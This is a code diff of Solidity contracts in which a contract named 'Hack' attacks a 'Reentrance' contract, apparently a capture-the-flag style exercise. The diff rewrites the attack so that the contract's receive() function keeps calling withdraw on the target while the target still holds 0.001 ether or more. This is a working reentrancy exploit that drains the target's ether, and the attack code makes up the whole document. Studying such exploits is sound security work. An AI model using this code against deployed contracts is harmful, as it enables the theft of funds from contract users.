@@ -60,6 +60,8 @@ contract Helper {
 interface ReentranceI {
     function withdraw(uint _amount) external;
     function donate(address _to) external payable;
+    function balanceOf(address _who) external view returns (uint balance);
+    receive() external payable;
 }
 
 contract Hack {
@@ -68,24 +70,29 @@ contract Hack {
 
     uint attackAmount; 
 
-    uint i = 0;
+    uint target_value = 0.001 ether;
 
-    constructor(address _add) {
+    constructor(address payable _add)  {
         deposit_contract = ReentranceI(_add);
     }
 
     function deposit() public payable {
+       require(msg.value >= target_value, "Should be >= 100");
         deposit_contract.donate{value: msg.value}(address(this));
     }
     
     function attack() public payable {
-        attackAmount = msg.value;
-        deposit();
-        withdraw(attackAmount);
+        require(msg.value >= target_value);
+        deposit_contract.donate{value: msg.value}(address(this));
+        deposit_contract.withdraw(msg.value);
     }
     
     function withdraw(uint amount) public {
         deposit_contract.withdraw(amount);
+    }
+
+    function checkDonated() public view returns(uint) {
+        return deposit_contract.balanceOf(address(this));
     }
 
     function checkBalance() public view returns(uint) {
@@ -98,17 +105,10 @@ contract Hack {
 
     // Function to receive Ether. msg.data must be empty
     receive() external payable {
-      if (i == 0){
-          withdraw(100);       
+      uint target_balance = address(deposit_contract).balance;
+      if (target_balance >= target_value) {
+        deposit_contract.withdraw(target_value);
       }
-      i = 1;
     }
-
-    // Fallback function is called when msg.data is not empty
-    fallback() external payable {}
-   
-   
-
-
 
 }
